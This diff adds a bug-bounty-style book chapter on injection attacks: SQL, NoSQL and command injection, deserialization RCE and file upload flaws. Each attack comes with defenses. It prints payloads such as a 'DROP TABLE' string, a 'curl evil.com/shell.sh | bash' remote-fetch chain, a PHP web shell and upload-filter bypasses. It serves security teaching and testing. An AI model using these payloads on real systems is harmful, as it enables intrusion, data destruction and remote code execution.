@@ -1,0 +1,103 @@
+Chapter 6 – Injection Attacks: The Hunter’s Guide to Code Execution
+Injection is the crown jewel of web hacking—trick the server into running your commands. The core rule: never trust user input. Here’s how to find and exploit the four most common types.
+
+1. SQL Injection (SQLi) – The Data Vault Key
+How it works: You break out of a SQL query by injecting control characters (', --, ;). The database executes your malicious statement.
+
+Classic bypass: email=billy@gmail.com'-- → logs in without password.
+
+Destructive: billy@gmail.com'; DROP TABLE users;-- → obliterates data.
+
+Modern extraction: Use UNION SELECT to exfiltrate other tables, or out-of-band techniques (DNS/HTTP requests) when blind.
+
+Hunter’s Tactics:
+
+Test every parameter and cookie. Look for ', ", ), #, or /* that change the response or generate errors.
+
+Blind vs. non-blind: Detailed error messages (column names, stack traces) make exploitation trivial. Generic errors mean you’ll need time-based (SLEEP()) or boolean-based (AND 1=1) blind techniques.
+
+Tools: sqlmap automates detection and exploitation; use --tamper scripts to bypass WAFs.
+
+NoSQL injection: For MongoDB, test {"$gt": ""} in JSON params or username[$ne]= to bypass login. For Redis, try CRLF injection to write SSH keys or modify sessions.
+
+Defense (for code review):
+
+Parameterized queries (prepared statements) with bind variables – the golden rule.
+
+ORMs like ActiveRecord are safe unless raw SQL with string interpolation is used. Scan for where("email = '#{email}'") → immediate finding.
+
+Principle of least privilege: web app’s database user should only have SELECT, INSERT, UPDATE, DELETE – no DROP, ALTER.
+
+2. Command Injection – Shell Access from HTTP
+How it works: User input flows into a system command (nslookup, ping, git). You chain commands with &&, |, ;, `, or $().
+
+Example: domain=google.com && curl evil.com/shell.sh | bash → full RCE.
+
+Hunter’s Tactics:
+
+Fuzz parameters with command delimiters: ;, &&, ||, |, `, $(...), and newline (%0a). Observe response time and output.
+
+If output is visible, use cat /etc/passwd; if blind, use ping -c 10 attacker.com for timing.
+
+Map the technology stack: PHP’s system(), Python’s os.system() or subprocess.call with shell=True, Ruby’s `command`. The syntax matters.
+
+Look for file inclusion vulnerabilities that can chain into code execution (LFI to RCE via /proc/self/environ or log poisoning).
+
+Defense:
+
+Avoid shell commands when possible; use native libraries.
+
+If unavoidable, use escapeshellarg() (PHP) or pass arguments as an array (Python subprocess, Ruby system("cmd", arg)).
+
+Run the web server with minimal privileges (chroot).
+
+3. Remote Code Execution (RCE) – Exploiting Deserialization
+How it works: The server deserializes untrusted data (YAML, pickle, Java objects) and your payload triggers code execution during object reconstruction.
+
+Famous example: Rails YAML deserialization (CVE-2013-0156) allowed arbitrary Ruby code via XML parameter parsing.
+
+Hunter’s Tactics:
+
+Identify serialization in cookies, hidden fields, or API payloads. Look for base64 blobs starting with rO0 (Java), gASV (Python pickle), or YAML-like syntax.
+
+Use known gadget chains: ysoserial for Java, peek/pickle payloads for Python, phpggc for PHP.
+
+Even if you can’t get full RCE, deserialization may lead to file reads, SSRF, or DoS.
+
+Defense:
+
+Never deserialize untrusted data. Use safer formats like JSON with a strict schema.
+
+If unavoidable, use allowlist-based deserializers that disable code execution (e.g., Ruby’s YAML.safe_load, Python’s yaml.safe_load).
+
+Monitor vendor advisories for serialization library vulnerabilities.
+
+4. File Upload Vulnerabilities – Deliver Your Payload
+How it works: Upload a file containing server-executable code (e.g., shell.php, exploit.jsp, web.config with ASP code). If the server executes it, you get a web shell.
+
+Web shell: A minimal script like <?php system($_GET['cmd']); ?> that gives command-line access via a URL parameter.
+
+Hunter’s Tactics:
+
+Bypass client-side checks with Burp; test extensions: .php5, .phtml, .shtml, .phar, double extensions (.jpg.php), trailing spaces, null bytes.
+
+If the server renames but keeps the extension, still test execution. If it stores in /uploads/, visit that path.
+
+Try content-type manipulation (e.g., Content-Type: image/jpeg for a PHP shell).
+
+If direct execution is blocked, test for local file inclusion (LFI) to include your uploaded file as code.
+
+Polyglot files: a single file valid as both an image and PHP (e.g., GIF + PHP code embedded in comment).
+
+Defense (checklist for bounty reports):
+
+Store uploads in a separate domain (CDN, S3) or at least a non-executable directory.
+
+Rewrite file permissions: no execute bits, run antivirus/malware scan.
+
+Rename files to random hashes, strip original extension, set Content-Disposition: attachment to avoid MIME-type execution.
+
+Validate file magic bytes, not just extension, but know that polyglots exist.
+
+Disable direct execution of uploaded files via .htaccess (e.g., AddHandler cgi-script .php removed) or via Nginx config.
+
